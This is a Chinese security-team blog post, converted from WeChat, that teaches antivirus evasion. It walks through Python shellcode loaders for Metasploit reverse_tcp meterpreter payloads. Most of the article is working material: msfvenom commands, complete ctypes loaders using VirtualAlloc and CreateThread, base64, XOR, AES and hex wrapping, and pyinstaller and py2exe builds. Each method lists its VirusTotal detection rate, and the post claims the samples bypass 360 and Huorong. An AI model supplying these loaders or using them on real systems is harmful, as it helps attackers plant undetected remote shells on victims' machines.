> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247485810&idx=1&sn=fc9996ffa4cc388919b7bf6d3a58db90&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWQzria6PqdS5xcibKNPOyicFfN2Nwal3j2iacg8TWUnQmMCdpoAdUcfOl80eRMrQ7OjMiaiazLRBx2Mribw/640?wx_fmt=png)

**声明：****Tide 安全团队原创文章，转载请声明出处！****文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！**

本文目录概览：  

```
1 Python加载shellcode免杀介绍
2 通过py源码编译exe
    2.1 方法1：python加载C代码(VT免杀率19/70)
    2.2 方法2：py2exe打包编译exe (VT免杀率10/69)
    2.3 方法3：base64编码(VT免杀率16/70)
    2.4 方法4：py+C编译exe(VT免杀率18/69)
    2.5 方法5：xor加密(VT免杀率19/71)
    2.6 方法6：aes加密(VT免杀率19/71)
3 python加载器
    3.1 方法1：HEX加密(VT免杀率3/56)
    3.2 方法2：base64加密(VT免杀率3/56)
4 参考资料
```

**文章打包下载及相关软件下载：`https://github.com/TideSec/BypassAntiVirus`，对免杀感兴趣的小伙伴可以微信关注 "Tide 安全团队" 公众号或与我联系。**

* * *

免杀能力一览表
=======

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIb9qyDM44D8jxBRCIyaLLjiapK5javebkFs57Fiaic8EiaWgf5T4icHnWITlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbhPYvM4a0WmWeia8WIodDbt9cLTmfCCDMRa1RezzEC8vnvQROZoHiaWTw/640?wx_fmt=png)

  

**几点说明：**

**1、上表中标识 √ 说明相应杀毒软件未检测出病毒，也就是代表了 Bypass。**

**2、为了更好的对比效果，大部分测试 payload 均使用 msf 的`windows/meterperter/reverse_tcp`模块生成。**

**3、由于本机测试时只是安装了 360 全家桶和火绒，所以默认情况下 360 和火绒杀毒情况指的是静态 + 动态查杀。360 杀毒版本`5.0.0.8160`(2020.01.01)，火绒版本`5.0.34.16`(2020.01.01)，360 安全卫士`12.0.0.2002`(2020.01.01)。**

**4、其他杀软的检测指标是在`virustotal.com`（简称 VT）上在线查杀，所以可能只是代表了静态查杀能力，数据仅供参考，不足以作为免杀或杀软查杀能力的判断指标。**

**5、完全不必要苛求一种免杀技术能 bypass 所有杀软，这样的技术肯定是有的，只是没被公开，一旦公开第二天就能被杀了，其实我们只要能 bypass 目标主机上的杀软就足够了。**

* * *

1 Python 加载 shellcode 免杀介绍
==========================

由于 python 使用比较简单方便，所以现在很多免杀都是使用 python 来对 shellcode 进行处理，做一些加密、混淆，用 python 来实现各种加密也比较简单而且免杀效果相对不错，唯一不足的地方就是 py 编译生成的 exe 文件比较大。

免杀工具 avet、Python-Rootkit、Avoidz、Winpayloads、BackDoor-Factory 都使用了把 shellcode 嵌入 python 代码中，然后编译 py 文件为 exe，从而达到免杀的效果。

2 通过 py 源码编译 exe
================

2.1 方法 1：python 加载 C 代码 (VT 免杀率 19/70)
--------------------------------------

这种方法是 python 免杀最常见的一种方式，将 C 语言的 shellcode 嵌入到 py 代码中，然后借助于 pyinstaller 或 py2exe 编译打包成 exe，不过因为代码和原理比较简单，所以免杀效果一般。

先用 msfvenom 生成 shellcode:

```
msfvenom -p windows/meterpreter/reverse_tcp   LHOST=10.211.55.2 LPORT=3333   -f c
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbib7JKn8kFz9DgLeVXM9hZ0SicPS19Fdsv0NzkIYpib6K1cLE8mBBlZtqw/640?wx_fmt=png)

python 代码`pyshellcode.py`

```
#!/usr/bin/python
import ctypes

shellcode = bytearray("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b")

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

然后要使用 PyInstaller 将 py 转为 exe，pyinstaller 依赖于 pywin32，在使用 pyinstaller 之前，应先安装 pywin32。

pywin32 下载后，点击下一步安装即可`[https://sourceforge.net/projects/pywin32/files/pywin32](https://sourceforge.net/projects/pywin32/files/pywin32)`

pyinstaller 下载`[https://github.com/pyinstaller/pyinstaller/releases](https://github.com/pyinstaller/pyinstaller/releases)`，解压，安装好依赖包`pip install -r requirements.txt`，即可使用。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbwzJgGdqaia51MxaxYcZlplbmWV4S6oCUlZL0r9tGL7VjlfUG6ImX4vg/640?wx_fmt=png)

将`pyshellcode.py`复制到`C:\Python27_x86\pyinstaller`目录中，在该目录下执行命令编译 exe：

```
python pyinstaller.py -F -w pyshellcode.py
```

执行生成的 exe(文件大小 3.4M)，可上线，可过 360 和火绒

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbfBbVqnk1QrzPHNtFWM8q7aRByN5dqB3RmtGQ8KpTDEWd91HjaQbxgQ/640?wx_fmt=png)

msf 中可正常上线

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbcRdhjJOj5OK0iaqebZwsGNl3fZE1TAxPs9z1amWbZ4gkHGg7rtVIy1g/640?wx_fmt=png)

virustotal.com 中 19/70 个报毒

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbzPg1JoeY2eUMgFfGEfsEkWH50aXzH3lQXBgtEPoAJRmgr08B8xFCzA/640?wx_fmt=png)

2.2 方法 2：py2exe 打包编译 exe (VT 免杀率 10/69)
---------------------------------------

该方法借用了免杀工具`Python-Rootkit`的思路。

首先要在 windows 上安装 x86 版的 python。

**注意：必须使用 x86 版本 Python 2.7, 即使 Windows 是 x64 的，也要安装 32 位版本。**

我这里安装的是 Python 2.7.16 x86 windows 版：

```
https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
```

之后安装 32 位 Py2exe for python 2.7

```
https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download
```

在 Windows 上安装 OpenSSL（可选）

msfvenom 生成 python payload

```
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.211.55.2  LPORT=3333  -f raw -o shell.py
```

创建文件 setup.py

```
from distutils.core import setup

import py2exe

setup(

name = "Meter",

description = "Python-based App",

version = "1.0",

console = ["shell.py"],

options = {"py2exe":{"bundle_files":1,"packages":"ctypes","includes":"base64,sys,socket,struct,time,code,platform,getpass,shutil",}},

zipfile = None

)
```

在 msf 中设置 payload`windows/meterpreter/reverse_tcp`，监听相应 3333 端口。

在 windows 下执行`python.exe .\setup.py py2exe`，(文件大小 11M)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbiaw0CXzmwIDic2q39J3XPUBzGysBOViaCVn1aQZm44eJYN2WoybI9w2MQ/640?wx_fmt=png)

msf 中可正常上线

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIb6DssLkDHSKh5SJsTnGrQ4L1PLaNvQubtL25cgabIgicRV9ZYls5S8Mg/640?wx_fmt=png)

打开杀软进行测试，可正常上线

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbKQYiaSvkCxTy89JlsVFicjO80nm7xJ50tSIMVPADbxRdySPbk9bwoTEg/640?wx_fmt=png)

virustotal.com 中 10/69 个报毒

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbUw6DAaBkT7jDCZKAfaYevQr3bpJ0BuGpDJnNa1mTZz1HccibnbXck7A/640?wx_fmt=png)

2.3 方法 3：base64 编码 (VT 免杀率 16/70)
---------------------------------

和 2.1 方法一样，先生成 shellcode。

先用 msfvenom 生成 shellcode，记得要用 base64 编码:

```
msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64  LHOST=10.211.55.2 LPORT=3333   -f c
```

python 代码如下：

```
import ctypes
import base64

encode_shellcode = ""

shellcode = base64.b64decode(encode_shellcode)

rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

使用 pyinstaller 编译打包 exe，生成文件大小 3.4M

```
python pyinstaller.py -F -w pyshellcode.py
```

在测试机器运行时，360 杀毒静态查杀报警，但执行和上线都没问题。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbj5MEQSlUKarpSdnrkoa20IgdMfhUsIVVQvVqfDTPicgK5XkQfuOotsw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbsFPHv6w6uxgtP7HTCNEaRWk6oDibASkQXnibvUHo6FBxtnsJJNh82EJg/640?wx_fmt=png)

virustotal.com 中 16/71 个报毒

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbgPickqRY9w6xd2e2PEDXNNENcQKmQ7Xx0Sxia6u5UXsicu1RNgn2v9kjQ/640?wx_fmt=png)

2.4 方法 4：py+C 编译 exe(VT 免杀率 18/69)
----------------------------------

和 2.1 方法一样，先生成 shellcode。

先用 msfvenom 生成 shellcode:

```
msfvenom -p windows/meterpreter/reverse_tcp   LHOST=10.211.55.2 LPORT=3333   -f c
```

python 代码如下：

```
import ctypes

buf =  ""
#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
       if 1:
              ctypes.windll.use***.ShowWindow(whnd, 0)   
              ctypes.windll.kernel32.CloseHandle(whnd)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```

使用 pyinstaller 编译打包 exe，生成文件大小 3.4M

```
python pyinstaller.py -F -w pyshellcode.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIb0ZDFYtPwmq1dOdMRYQicluvsQtWA5upUiaicJ16HWEFicSIFd4LQoNibcmg/640?wx_fmt=png)  

virustotal.com 中 18/69 个报毒

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbwVFUicicYNw1I6RVSySs6yXm6BoqkBNajtfufCSCvNzk6JBdv8wLFdHw/640?wx_fmt=png)  

2.5 方法 5：xor 加密 (VT 免杀率 19/71)
------------------------------

这个和专题 27 中的方法 6 一样，需要使用一个工具`[https://github.com/Arno0x/ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper)`

先用 msfvenom 生成一个 raw 格式的 shellcode

```
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=10.211.55.2 lport=3333  -f raw > shellcode.raw
```

在`ShellcodeWrapper`文件夹中执行下面命令，其中`tidesec`为自己设置的 key。

```
python shellcode_encoder.py -cpp -cs -py shellcode.raw tidesec xor
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbiakliaIiafaMG9xIBugYUgwYy6S2T7akGcTCKHzPAq7IcAIlntXH6poHA/640?wx_fmt=png)  

生成了三个文件，有一个 py 文件，也是我们要用到的。

其中`encryptedShellcodeWrapper_xor.py`文件中的 python 源码如下

```
#!/usr/bin/python
# -*- coding: utf8 -*-
# Author: Arno0x0x, Twitter: @Arno0x0x
#
# You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py
from Crypto.Cipher import AES
from ctypes import *
import base64

# data as a bytearray
# key as a string
def xor(data, key):
    l = len(key)
    keyAsInt = map(ord, key)
    return bytes(bytearray((
        (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
    )))

#------------------------------------------------------------------------
def unpad(s):
    """PKCS7 padding removal"""
    return s[:-ord(s[len(s)-1:])]

#------------------------------------------------------------------------
def aesDecrypt(cipherText, key):
    """Decrypt data with the provided key"""

    # Initialization Vector is in the first 16 bytes
    iv = cipherText[:AES.block_size]

    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(cipherText[AES.block_size:]))

if __name__ == '__main__':

    encryptedShellcode = ("\xaf\xac\xda\x91\...")
    key = "tidesec"
    cipherType = "xor"

    # Decrypt the shellcode
    if cipherType == 'xor':
        shellcode = xor(bytearray(encryptedShellcode), key)
    elif cipherType == 'aes':
        key = base64.b64decode(key)
        shellcode = aesDecrypt(encryptedShellcode, key)
    else:
        print "[ERROR] Unknown cipher type"

    # Copy the shellcode to memory and invoke it
    memory_with_shell = create_string_buffer(shellcode, len(shellcode))
    shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))
    shell()
```

使用 pyinstaller 编译：

```
python pyinstaller.py --onefile --noconsole encryptedShellcodeWrapper_xor.py
```

编译执行，可上线，virustotal.com 上查杀率 19/71

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbkUMqx7DD9oF9yI5Dre2130Q78MxsYFGWGBsLw17hbQrlFJ04ajssaA/640?wx_fmt=png)  

2.6 方法 6：aes 加密 (VT 免杀率 19/71)
------------------------------

这个和上面的方法 5：xor 加密一样，需要使用一个工具`[https://github.com/Arno0x/ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper)`

先用 msfvenom 生成一个 raw 格式的 shellcode

```
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=10.211.55.2 lport=3333  -f raw > shellcode.raw
```

在`ShellcodeWrapper`文件夹中执行下面命令，其中`tidesec`为自己设置的 key，加密方式设置为 aes 即可。

```
python shellcode_encoder.py -cpp -cs -py shellcode.raw tidesec aes
```

其中`encryptedShellcodeWrapper_aes.py`文件中的 python 源码如下

```
#!/usr/bin/python
# -*- coding: utf8 -*-
# Author: Arno0x0x, Twitter: @Arno0x0x
#
# You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py
from Crypto.Cipher import AES
from ctypes import *
import base64

#------------------------------------------------------------------------
# data as a bytearray
# key as a string
def xor(data, key):
    l = len(key)
    keyAsInt = map(ord, key)
    return bytes(bytearray((
        (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
    )))

#------------------------------------------------------------------------
def unpad(s):
    """PKCS7 padding removal"""
    return s[:-ord(s[len(s)-1:])]

#------------------------------------------------------------------------
def aesDecrypt(cipherText, key):
    """Decrypt data with the provided key"""

    # Initialization Vector is in the first 16 bytes
    iv = cipherText[:AES.block_size]

    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(cipherText[AES.block_size:]))

if __name__ == '__main__':

    encryptedShellcode = ("\x32\x1f\x96")
    key = "IePGfIakAIG4GxOkNEbyXA=="
    cipherType = "aes"

    # Decrypt the shellcode
    if cipherType == 'xor':
        shellcode = xor(bytearray(encryptedShellcode), key)
    elif cipherType == 'aes':
        key = base64.b64decode(key)
        shellcode = aesDecrypt(encryptedShellcode, key)
    else:
        print "[ERROR] Unknown cipher type"

    # Copy the shellcode to memory and invoke it
    memory_with_shell = create_string_buffer(shellcode, len(shellcode))
    shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))
    shell()
```

使用 pyinstaller 编译：

```
python pyinstaller.py --onefile --noconsole encryptedShellcodeWrapper_aes.py
```

编译执行，可上线，virustotal.com 上查杀率 19/71，和上面的 xor 加密一样。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIb8xd1chm3etk8TBzo7FicbMMcoQ0a1wUccnicz5WhTI0VR7hTqKTK1Yicg/640?wx_fmt=png)  

3 python 加载器
============

3.1 方法 1：HEX 加密 (VT 免杀率 3/56)
-----------------------------

这是使用了 k8 的方法：`[https://www.cnblogs.com/k8gege/p/11223393.html](https://www.cnblogs.com/k8gege/p/11223393.html)`k8 的工具 scrun 不仅提供了加载 python 代码，还能加载 C#。

先用 msfvenom 生成一个 c 格式的 shellcode

```
msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=10.211.55.2 lport=3333  -f c -o shell.c
```

把 shellcode 转成 hex，我这就也用 k8 飞刀了。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbhLPAFm8tNm9vdj3pDgicUPGeFHmTMicsGx92xpBFhfSJZSemeRn44llA/640?wx_fmt=png)  

然后下载这里的工具：`[https://github.com/k8gege/scrun](https://github.com/k8gege/scrun)`

使用`python ScRunHex.py hexcode`就可以加载执行 shellcode 了

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbz5cWo4Tk5wia0Gm1xvFZzff95FtCV21vz32L0cIH0dSDbAJksLLbJjg/640?wx_fmt=png)  

msf 中正常上线

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbIa8MkVfv0JvDGia0aFj5ASBE2MB5mZXDpDMOJUvx2Nib3BicaWPGpAc2Q/640?wx_fmt=png)  

virustotal.com 上`ScRunHex.py`查杀率 3/56

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbrZdccIwxfO1ic3F2m5lVH8LwN6YTZNA2AlGhyLQqy5xzqhcZFibWaM2A/640?wx_fmt=png)  

这里也可以直接用`scrun.exe`来直接执行 hex 代码，不过编译好的`scrun.exe`早就被各大杀软加特征库里了 (VT 免杀率 41/71)，还是自己编译的好一些。

其实`ScRunHex.py`也可以编译成 exe，代码需要修改一下。

```
#scrun by k8gege
import ctypes
import sys
shellcode = bytearray(("shellcode-hexcode").decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

编译 exe 后执行，可正常上线，不过 virustotal.com 上查杀率 17/69。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIbDzLEyFbIMTc4dibuxYaTo5AnIoTiaicTL6POB4CWfrRCGPLpZTuszSqDA/640?wx_fmt=png)

3.2 方法 2：base64 加密 (VT 免杀率 3/56)
--------------------------------

和上面的 3.1 一样，也是 k8 的大作，使用了 base64+hex 的方式处理 shellcode。

文件`ScRunBase64.py`代码如下

```
#scrun by k8gege
import ctypes
import sys
import base64
shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

virustotal.com 上`ScRunBase64.py`查杀率 4/58

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWKSfibtl3qJIyDU15icGvGIb5fo5DBXkkWj2vJHEMGfGaHJzMlF29bFInRQBYjGSictGDJkqKHocKsA/640?wx_fmt=png)  

4 参考资料
======

CS 强化_python 免杀：`[https://mp.weixin.qq.com/s/9U7TJiLTIVQNvEakJ-yIAA](https://mp.weixin.qq.com/s/9U7TJiLTIVQNvEakJ-yIAA)`

shellcode 加载总结:`[https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html](https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html)`

E

  

N

  

D

  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWQzria6PqdS5xcibKNPOyicFfZ2sTo8IbLUXAHkbaTia2VrkCfv7an1AjYvbZHXG6wiaQRoOBHibF7qaxQ/640?wx_fmt=png)

guān

**关**

  

zhù

**注**

  

wǒ

**我**

  

men

**们**

  

**Tide 安全团队正式成立于 2019 年 1 月****，****是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。**

**对安全感兴趣的小伙伴可以关注****关注团队官网: http://www.TideSec.com 或长按二维码关注公众号：**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RWQzria6PqdS5xcibKNPOyicFfRX5ERyRfm6mkSeiaB5fV7YwDVIia6ObctziagiaQicU8nSLvu4r46EGunSQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWQzria6PqdS5xcibKNPOyicFfjZMAGxA6hhGtZeFn4Z93g13GbRewGk27vicricUD4ciccoaSp6DyG4w9Q/640?wx_fmt=gif)